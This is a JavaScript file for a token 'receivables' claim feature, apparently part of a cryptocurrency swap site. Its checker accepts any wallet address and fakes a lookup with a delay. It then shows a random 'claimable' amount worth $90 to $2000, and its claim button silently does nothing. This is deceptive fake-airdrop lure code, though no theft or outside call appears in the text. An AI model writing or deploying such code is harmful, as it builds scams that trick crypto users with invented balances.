// MONAD RECEIVABLES Feature
class ReceivablesManager {
    constructor() {
        this.modal = document.getElementById('receivablesModal');
        this.receivablesLink = document.getElementById('receivablesLink');
        this.closeBtn = document.getElementById('closeReceivablesBtn');
        this.checkBtn = document.getElementById('checkAddressBtn');
        this.claimBtn = document.getElementById('claimTokensBtn');
        this.addressInput = document.getElementById('walletAddress');
        this.resultContainer = document.getElementById('receivablesResult');
        this.errorContainer = document.getElementById('receivablesError');
        this.claimAmountEl = document.getElementById('claimAmount');
        this.usdValueEl = document.getElementById('usdValue');
        this.backdrop = document.getElementById('receivablesBackdrop');
        
        this.pendingAmount = null;
        this.currentMonPrice = 0.02453; // Default MON price
        
        this.init();
    }
    
    init() {
        this.receivablesLink?.addEventListener('click', (e) => {
            e.preventDefault();
            this.openModal();
        });
        
        this.closeBtn?.addEventListener('click', () => this.closeModal());
        this.backdrop?.addEventListener('click', (e) => {
            if (e.target === this.backdrop) this.closeModal();
        });
        
        this.checkBtn?.addEventListener('click', () => this.checkAddress());
        this.claimBtn?.addEventListener('click', () => this.claimTokens());
        
        this.addressInput?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.checkAddress();
        });
        
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && this.modal?.style.display === 'block') {
                this.closeModal();
            }
        });
        
        if (window.currentToToken?.price) {
            this.currentMonPrice = window.currentToToken.price;
        }
    }
    
    openModal() {
        if (!this.modal) return;
        this.resetModal();
        this.modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            this.addressInput?.focus();
        }, 100);
    }
    
    closeModal() {
        if (!this.modal) return;
        this.modal.style.display = 'none';
        document.body.style.overflow = '';
        this.resetModal();
    }
    
    resetModal() {
        this.addressInput.value = '';
        this.resultContainer.style.display = 'none';
        this.errorContainer.style.display = 'none';
        this.claimBtn.disabled = false;
        this.claimBtn.textContent = 'Claim Tokens';
        this.pendingAmount = null;
    }
    
    // Accept ANY non-empty address
    isValidMonadAddress(address) {
        return !!address;
    }
    
    generateRandomAmount() {
        // Desired USD range
        const minUsd = 90;
        const maxUsd = 2000;

        // Get current MON price
        const monPrice = window.currentToToken?.price || this.currentMonPrice || 0.02453;

        // Convert USD range to MON range
        const minMon = minUsd / monPrice;
        const maxMon = maxUsd / monPrice;

        // Generate random MON amount within this range
        const random = Math.random() * (maxMon - minMon) + minMon;
        return parseFloat(random.toFixed(4));
    }
    
    async checkAddress() {
        const address = this.addressInput.value.trim();
        
        if (!address) {
            this.showError('Please enter a wallet address');
            return;
        }
        
        // Always accept address now
        const originalText = this.checkBtn.textContent;
        this.checkBtn.textContent = 'Checking...';
        this.checkBtn.disabled = true;
        
        setTimeout(() => {
            const monAmount = this.generateRandomAmount();
            const monPrice = window.currentToToken?.price || this.currentMonPrice || 0.02453;
            const usdValue = monAmount * monPrice;
            
            this.claimAmountEl.textContent = monAmount.toFixed(4);
            this.usdValueEl.textContent = usdValue.toFixed(2);
            
            this.resultContainer.style.display = 'block';
            this.errorContainer.style.display = 'none';
            
            this.pendingAmount = monAmount;
            
            this.checkBtn.textContent = originalText;
            this.checkBtn.disabled = false;
            
            console.log(`Found ${monAmount} MON (~$${usdValue.toFixed(2)}) for address: ${address}`);
        }, 1500);
    }
    
    showError(message) {
        const errorMessage = this.errorContainer.querySelector('.error-message');
        if (errorMessage) {
            errorMessage.textContent = message;
        }
        this.errorContainer.style.display = 'block';
        this.resultContainer.style.display = 'none';
    }
    
    async claimTokens() {
        if (!this.pendingAmount) return;
        
        const address = this.addressInput.value.trim();
        
        if (!address) {
            this.showError('Invalid address. Please check and try again.');
            return;
        }
        
        this.claimBtn.disabled = true;
        this.claimBtn.textContent = 'Processing...';
        
        setTimeout(() => {
            // Stay quiet: no alert, just close modal silently
            this.closeModal();
            
            // Reset claim button
            this.claimBtn.disabled = false;
            this.claimBtn.textContent = 'Claim Tokens';
            
            console.log(`Claimed ${this.pendingAmount.toFixed(4)} MON for ${address}`);
        }, 2000);
    }
}

// Initialize receivables manager
const receivablesManager = new ReceivablesManager();
window.receivablesManager = receivablesManager;

setInterval(() => {
    if (window.currentToToken?.price) {
        receivablesManager.currentMonPrice = window.currentToToken.price;
    }
}, 5000);